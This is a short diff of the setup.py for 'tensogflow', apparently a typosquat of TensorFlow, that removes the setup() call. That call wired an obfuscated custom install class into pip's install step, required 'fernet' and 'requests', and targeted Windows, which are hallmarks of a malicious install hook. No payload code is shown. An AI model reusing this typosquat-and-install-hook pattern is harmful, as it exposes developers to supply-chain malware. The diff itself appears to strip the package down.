@@ -18,22 +18,5 @@ class sIyelJrUuFmUXGEQmSNRuUoKRCpuDkfUXQRZirtALHrLLeucpYwqaTTkuTNBsgjnnofpuCxegT
             install.run(self)
 
 
-setup(
-    name="tensogflow",
-    version=VERSION,
-    author="iUbpo",
-    author_email="iXveJVRpzqwleW@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': sIyelJrUuFmUXGEQmSNRuUoKRCpuDkfUXQRZirtALHrLLeucpYwqaTTkuTNBsgjnnofpuCxegTeOdmmIpyiZoaywLmHPsruKYWWUgjDIueqMnvqGaSmowSbxlDwLZHvqpwiwSqRsfmwdmSvOHJy,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            
 
